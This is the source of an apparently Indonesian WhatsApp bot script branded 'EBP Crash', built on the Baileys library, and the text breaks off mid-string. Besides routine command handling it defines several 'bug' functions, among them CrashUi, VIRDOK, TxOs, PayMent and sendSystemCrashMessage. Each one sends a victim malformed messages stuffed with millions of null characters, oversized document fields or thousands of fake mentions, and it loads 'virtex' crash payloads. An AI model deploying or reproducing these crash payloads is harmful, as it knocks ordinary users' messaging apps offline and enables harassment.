// SPECIAL SCRIPT BY EKUZIKA X BRANZZ X PXYRA

require("./database/place")
require("./config")

module.exports = async (ekuzika, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
const isCmd = body.startsWith(prefix)
var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await ekuzika.decodeJid(ekuzika.user.id)
const sender = m.key.fromMe ? (ekuzika.user.id.split(':')[0]+'@s.whatsapp.net' || ekuzika.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = m.isGroup ? await ekuzika.groupMetadata(m.chat).catch(e => {}) : ''
//const groupName = m.isGroup ? groupMetadata.subject : ' '
const participants = m.isGroup ? await groupMetadata.participants : ' '
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ' '
const groupOwner = m.isGroup ? groupMetadata.owner : ' '
const groupMembers = m.isGroup ? groupMetadata.participants : ' '
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./ebpcrash.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const { generateProfilePicture, reSize } = require('./database/lib/myfunction.js')
const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
const func = require("./database/place")
const usePairingCode = true
const fetch = require('node-fetch')
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)

const bugres = '\`𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 . . .\` \n\n**Noted:* _Silahkan jeda 3 - 5 menit setelah bug selesai di proses_'

// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
		const { 
		    ngazap 
		} = require('./database/virtex/ngazap')
        const { 
            buttonkal 
        } = require('./database/virtex/buttonkal')
        const { 
            cttl 
        } = require('./database/virtex/cttl')
        const {
            tizi 
        } = require('./database/virtex/tizi')
        const { 
            weg 
        } = require('./database/virtex/weg')
        const { 
            virtex7 
        } = require('./database/virtex/virtex7')
        const { 
            notif3 
        } = require("./database/virtex/notif3")
        const { 
            notif4 
        } = require("./database/virtex/notif4")
	
	
	// Func GetRandom Vid \\
	const images = [
	"https://pomf2.lain.la/f/3di8e6c1.mp4",
	"https://pomf2.lain.la/f/bletshki.mp4",
	"https://pomf2.lain.la/f/i1ofuau5.mp4",
	"https://pomf2.lain.la/f/turdz5bi.mp4",
	"https://pomf2.lain.la/f/a0t4joe8.mp4",
	"https://pomf2.lain.la/f/733lyez1.mp4",
	"https://pomf2.lain.la/f/pitzd36m.mp4",
	"https://pomf2.lain.la/f/mbz80ss5.mp4",
	"https://pomf2.lain.la/f/foqjp4i.mp4",
	"https://pomf2.lain.la/f/cb87ifek.mp4",
	"https://pomf2.lain.la/f/mbz80ss5.mp4",
	"https://pomf2.lain.la/f/mddmpfy7.mp4",
	"https://pomf2.lain.la/f/zbgcgut2.mp4",
	"https://pomf2.lain.la/f/j2zd7db.mp4",
	"https://pomf2.lain.la/f/y58vu7yk.mp4",
	"https://pomf2.lain.la/f/z6ae6pl0.mp4",
	"https://pomf2.lain.la/f/hhs3wji.mp4",
	"https://pomf2.lain.la/f/sl74sd0v.mp4",
	"https://pomf2.lain.la/f/3ouxh0hn.mp4"
	];
	
	function getRandomImage() {
			const randomIndex = Math.floor(Math.random() * images.length);
			return images[randomIndex];
		}
		const thumbVid = getRandomImage()
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return ekuzika.updateBlockStatus(m.sender, 'block')
// auto anti bug
if (global.antibug) {
if (!isGroup && m.isBaileys && m.fromMe) {
await ekuzika.sendMessage(m.chat, {
delete: {
remoteJid: m.chat, fromMe: true, id: m.key.id
}})
await ekuzika.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
*Nomor :* ${m.sender.split("@")[0]}`}, {quoted: null})
}}

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ Message ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       
    ekuzika.autoshalat = ekuzika.autoshalat ? ekuzika.autoshalat : {}
    let id = m.chat
    if (id in ekuzika.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        ekuzika.autoshalat[id] = [
            ekuzika.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `𝐄BP Crash`,
        body: ` `,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete ekuzika.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))
const devNumber = ["628889616144","6285814677025","6282228286802","6287768370125"]

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   ekuzika.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: ekuzika.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `𝐀𝐧𝐭𝐢𝐌𝐚𝐫𝐠𝐚`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await ekuzika.sendPresenceUpdate('composing', jid)
      return ekuzika.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
		// Func Bug By Ekzika
		// Don't re-edit guys:)

		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await ekuzika.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await ekuzika.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(1255000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"▾ ɛɮք ƈʀ͢ǟֆɦ ▾\":\k${bugpdf}+${bugpdf}\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '' + buttonkal,
							}
						}
					}
				}
			}), {});
			ekuzika.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 Payment 𝐁𝐲 ｢ eBpCrash ｣"));
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "🔥፝⃟ ꙳ɛɮք ƈʀ͢ǟֆɦ🔥፝⃟ " + buttonkal,
							"jpegThumbnail": "",
							"caption": `Undangan Admin Channel ekuzikaxzo Script\n` + buttonkal + bugpdf,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await ekuzika.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 Newsletter 𝐁𝐲 ｢ eBpCrash ｣"));
		}
		
		async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "*★ 🔥፝⃟ ꙳ɛɮք ƈʀ͢ǟֆɦ🔥፝⃟  ★*" + "\0".repeat(990000),
      'footerText': "",
      'description': "",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': " ",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await ekuzika.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
		
		async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "*★ 🔥፝⃟ ꙳ɛɮք ƈʀ͢ǟֆɦ🔥፝⃟  ★*" + bugpdf + bugpdf
          },
          'footer': {
            'text': ''
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '*★ 🔥፝⃟ ꙳ɛɮք ƈʀ͢ǟֆɦ🔥፝⃟  ★*', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(3000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await ekuzika.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
        async function CrashUi(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸ɛɮք ƈʀ͢ǟֆɦ ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ ɛɮք ƈʀ͢ǟֆɦ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + '\0'.repeat(999999)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await ekuzika.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 CrashUi 𝐁𝐲 ｢ eBpCrash ｣"));
		};
		
		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🔥፝⃟ ꙳ɛɮք ƈʀ͢ǟֆɦ🔥\n፝⃟` + buttonkal + bugpdf,
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await ekuzika.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 VIRDOK 𝐁𝐲 ｢ eBpCrash ｣"));
		}
		
		async function TxOs(X, Ptcp = false) {
			await ekuzika.relayMessage(X, {
					extendedTextMessage: {
						text: "⭑ɛɮք ƈʀ͢ǟֆɦ⭑̤\n" + "@1".repeat(99999),
						contextInfo: {
							mentionedJid: [
								"6281991410@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: X,
							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/